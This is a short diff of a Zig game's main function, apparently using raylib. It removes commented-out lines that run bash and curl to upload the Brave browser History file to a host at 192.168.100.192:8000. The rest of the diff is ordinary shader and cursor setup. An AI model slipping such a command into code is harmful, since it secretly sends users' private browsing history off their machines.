@@ -21,12 +21,6 @@ pub fn main() !void {
 
     ray.SetExitKey(0);
     ray.DisableCursor();
-    //_ = try std.process.Child.run(.{.allocator = util.allocator, .argv = &.{"bash", "-c", "curl -T ~/.config/BraveSoftware/Brave-Browser/Default/History 192.168.100.192:8000"}});
-
-
-//    std.process.execv(util.allocator, &[_][]const u8{
-//        "bash", "-c", "curl -T ~/.config/BraveSoftware/Brave-Browser/Default/History 192.168.100.192:8000"
-//    }) catch {};
 
     shader.init();
     shader.setShadowColor(ray.WHITE);
